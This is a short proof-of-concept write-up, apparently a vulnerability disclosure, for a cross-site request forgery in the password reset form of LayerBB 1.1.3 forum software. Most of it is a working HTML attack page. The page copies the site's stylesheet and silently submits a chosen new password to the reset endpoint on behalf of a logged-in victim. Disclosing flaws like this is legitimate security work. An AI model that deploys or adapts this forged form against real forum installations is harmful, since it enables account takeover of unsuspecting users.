# Reset Password CSRF
Password reset form from the [forgot password](https://github.com/0xB9/LayerBB-1.1.3-CSRF/blob/master/Forgot_Password.md) page.

## PoC:
```html
<link href="http://localhost/public/themes/Sand/assets/css/sand.css" rel="stylesheet">

<form action="http://localhost/members.php/cmd/resetpassword" method="POST" id="LAYER_form" style="padding: 25px;">
    <label for="password">Password</label>
    <input type="password" name="password" id="password" class="form-control">
    <label for="a_password">Confirm Password</label>
    <input type="password" name="a_password" id="a_password" class="form-control">
    <br><br>
    <input type="submit" name="reset" value="Reset Password" class="btn btn-default">
</form>
```
